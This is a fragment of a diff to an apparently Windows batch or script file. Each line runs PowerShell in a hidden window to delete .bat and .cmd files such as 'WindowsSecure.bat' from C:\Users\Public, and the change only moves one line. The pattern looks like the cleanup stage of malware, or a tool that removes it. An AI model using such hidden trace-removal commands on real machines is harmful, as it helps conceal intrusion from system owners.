@@ -66,6 +66,6 @@ C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Re
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\Document\\dc.bat;
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\Document\\dc2.bat;
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\Document\\WindowsSecure.bat;
-C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\Document\\d.bat;
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\dcc.cmd;
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\dcc2.cmd;
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Remove-item C:\\Users\\Public\\Document\\d.bat;
